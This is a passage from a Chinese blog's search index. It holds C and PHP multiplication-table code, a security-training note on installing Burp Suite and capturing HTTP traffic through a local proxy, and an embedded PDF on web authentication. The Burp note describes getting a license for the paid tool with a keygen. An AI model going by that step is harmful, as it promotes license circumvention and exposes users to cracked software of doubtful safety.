class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>; i &lt;= <span class="hljs-number">9</span>; i++) <br>&#123;<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">1</span>; j &lt;= i; j++) <br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%dx%d=%d &quot;</span>, j, i, i * j);<br>&#125;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>php</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">html</span> <span class="hljs-meta-keyword">PUBLIC</span> <span class="hljs-meta-string">&quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot;</span> <span class="hljs-meta-string">&quot;http://www.w3.org/TR/html4/loose.dtd&quot;</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;Content-Type&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;text/html; charset=UTF-8&quot;</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>九九乘法表<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/css&quot;</span>&gt;</span><span class="css"></span></span><br><span class="css"><span class="xml"><span class="hljs-selector-tag">table</span>&#123;</span></span><br><span class="css"><span class="xml">    <span class="hljs-attribute">border-collapse</span>:collapse; <span class="hljs-attribute">border-spacing</span>:<span class="hljs-number">0</span>; <span class="hljs-attribute">border-left</span>:<span class="hljs-number">1px</span> solid <span class="hljs-number">#aaa</span>; <span class="hljs-attribute">border-top</span>:<span class="hljs-number">1px</span> solid <span class="hljs-number">#aaa</span>; </span></span><br><span class="css"><span class="xml">&#125;</span></span><br><span class="css"><span class="xml"><span class="hljs-selector-tag">td</span>&#123;</span></span><br><span class="css"><span class="xml">    <span class="hljs-attribute">border-right</span>:<span class="hljs-number">1px</span> solid <span class="hljs-number">#aaa</span>; <span class="hljs-attribute">border-bottom</span>:<span class="hljs-number">1px</span> solid <span class="hljs-number">#aaa</span>; <span class="hljs-attribute">padding</span>:<span class="hljs-number">3px</span> <span class="hljs-number">15px</span>; <span class="hljs-attribute">text-align</span><span class="hljs-selector-pseudo">:left</span>; <span class="hljs-attribute">color</span>:<span class="hljs-number">#3C3C3C</span>;</span></span><br><span class="css"><span class="xml">&#125;</span></span><br><span class="css"><span class="xml"></span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">table</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&#x27;600&#x27;</span> <span class="hljs-attr">border</span>=<span class="hljs-string">&#x27;1&#x27;</span>&gt;</span></span><br><span class="xml"></span><span class="php"><span class="hljs-meta">&lt;?php</span> </span><br><span class="php"><span class="hljs-comment">//控制行数</span></span><br><span class="php"> <span class="hljs-keyword">for</span>(<span class="hljs-variable">$j</span>=<span class="hljs-number">1</span>;<span class="hljs-variable">$j</span>&lt;=<span class="hljs-number">9</span>;<span class="hljs-variable">$j</span>++)&#123;</span><br><span class="php">     <span class="hljs-comment">//tr开始</span></span><br><span class="php">     <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;tr&gt;&quot;</span>;</span><br><span class="php">     <span class="hljs-comment">//控制列数</span></span><br><span class="php">     <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">1</span>;<span class="hljs-variable">$i</span>&lt;=<span class="hljs-variable">$j</span>;<span class="hljs-variable">$i</span>++)&#123;</span><br><span class="php">         <span class="hljs-comment">//输出td</span></span><br><span class="php">         <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;td&gt;<span class="hljs-subst">&#123;$i&#125;</span>x<span class="hljs-subst">&#123;$j&#125;</span>=&quot;</span>.(<span class="hljs-variable">$i</span>*<span class="hljs-variable">$j</span>).<span class="hljs-string">&quot;&lt;/td&gt;&quot;</span>;</span><br><span class="php">    &#125;</span><br><span class="php">    <span class="hljs-comment">//tr结束</span></span><br><span class="php">     <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/tr&gt;&quot;</span>;</span><br><span class="php">&#125;</span><br><span class="php"><span class="hljs-meta">?&gt;</span></span><span class="xml"></span><br><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">table</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p>​    </p><p>​    </p>]]></content>
    
    
    <categories>
      
      <category>cs</category>
      
    </categories>
    
    
    <tags>
      
      <tag>knowledge</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>burp</title>
    <link href="/2020/11/19/burp/"/>
    <url>/2020/11/19/burp/</url>
    
    <content type="html"><![CDATA[<p>721第一次培训就网络安全对其进行一些介绍和方向上的讲解，还有一些网络钓鱼，字典爆破等攻击手段，并演示了burp实现对HTTP的抓包，分析抓包的内容，以及分享了利用burp可以实现什么。</p><p>此次任务有：熟悉HTTP协议，利用burp抓包，搭建虚拟机kali。</p><h1 id="重点内容：burp"><a href="#重点内容：burp" class="headerlink" title="重点内容：burp"></a>重点内容：burp</h1><h2 id="1-1burp的安装"><a href="#1-1burp的安装" class="headerlink" title="1.1burp的安装"></a>1.1burp的安装</h2><p>①<strong>配置Java环境</strong><br>(问：为什么要这样配置     答：burp是由Java语言编写而成，其可执行程序是java文件类型的jar文件，运行时依赖于JRE)<br>②<strong>配置系统的环境变量</strong>（环境变量，就是在操作系统中一个具有特定名字的对象，它包含了一个或者多个应用程序所将使用到的信息。例如Windows和DOS操作系统中的path环境变量，当要求系统运行一个程序而没有告诉它程序所在的完整路径时，系统除了在当前目录下面寻找此程序外，还应到path中指定的路径去找。用户通过设置环境变量，来更好的运行进程。）<br>③由于burp是付费软件，我们需要<strong>使用注册机来获取license</strong>，如图<img src="https://img-blog.csdnimg.cn/20201119214908963.gif#pic_center" alt="burp注册机的操作">③注册后即可使用burp</p><h2 id="1-2抓包"><a href="#1-2抓包" class="headerlink" title="1.2抓包"></a>1.2抓包</h2><p>①<strong>对浏览器设置代理</strong>：安装foxyproxy插件，设置代理IP<br>127.0.0.1 端口8080的代理<br>②打开浏览器，打开代理，随便打开一个网站，在burp的<strong>proxy</strong>即可查看对网站HTTP的抓包,将所抓的包发至<strong>repeater</strong>，即可对网站的回应进行拦截。</p><p><img src="https://img-blog.csdnimg.cn/20201119223920841.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70#pic_center" alt="proxy"><br><img src="https://img-blog.csdnimg.cn/20201119224103488.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70#pic_center" alt="repeater"></p><h2 id="搭建kali"><a href="#搭建kali" class="headerlink" title="搭建kali"></a>搭建kali</h2><p>2.1安装VMware Workstation （略）<br>2.2下载镜像文件（略）<br>2.3安装kali（略）</p><h2 id="3-HTTP协议—–看书"><a href="#3-HTTP协议—–看书" class="headerlink" title="3.HTTP协议—–看书"></a>3.HTTP协议—–看书</h2>]]></content>
    
    
    <categories>
      
      <category>cs</category>
      
    </categories>
    
    
    <tags>
      
      <tag>tools</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[知乎转载]-鉴权向</title>
    <link href="/2020/11/19/%5B%E7%9F%A5%E4%B9%8E%E8%BD%AC%E8%BD%BD%5D-%E9%89%B4%E6%9D%83%E5%90%91/"/>
    <url>/2020/11/19/%5B%E7%9F%A5%E4%B9%8E%E8%BD%AC%E8%BD%BD%5D-%E9%89%B4%E6%9D%83%E5%90%91/</url>
    
    <content type="html"><![CDATA[<div class="row">    <embed src="/pdf/一文搞懂鉴权之cookie&amp;session&amp;token&amp;jwt&amp;单点登录.pdf" width="100%" height="550" type="application/pdf"></div>]]></content>
    
    
    <categories>
      
      <category>cs</category>
      
    </categories>
    
    
    <tags>
      
      <tag>knowledge</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
